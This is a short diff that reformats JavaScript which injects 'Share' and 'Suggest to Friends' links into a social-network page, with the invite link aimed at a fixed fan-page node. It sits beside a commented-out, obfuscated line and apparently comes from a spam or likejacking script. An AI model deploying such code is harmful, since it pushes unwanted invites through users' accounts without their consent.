@@ -218,10 +218,12 @@ document.getElementById('app4949752878_shdiv').innerHTML =
          'Share' +
     '</a>';
 
-//void(d[v[2]](_0x8a00[20])[v[0]]=[v[3]]);sl=d[v[2]](_0x8a00[21]);var ss=d[v[2]](v[4]);var c=d[v[6]](v[5]);
+//void(d[v[2]](_0x8a00[20])[v[0]]=[v[3]]);sl=d[v[2]](_0x8a00[21]);
+//var ss=d[v[2]](v[4]);var c=d[v[6]](v[5]);
 document.getElementById('app4949752878_sgdiv').innerHTML =
     '<a id="suggest" href="#" ' +
-        'ajaxify="/ajax/social_graph/invite_dialog.php?class=FanManager&node_id=169625639721292" ' +
+        'ajaxify="/ajax/social_graph/invite_dialog.php?' +
+            'class=FanManager&node_id=169625639721292" ' +
         'class="profile_action actionspro_a" rel="dialog-post">' +
             'Suggest to Friends' +
     '</a>';
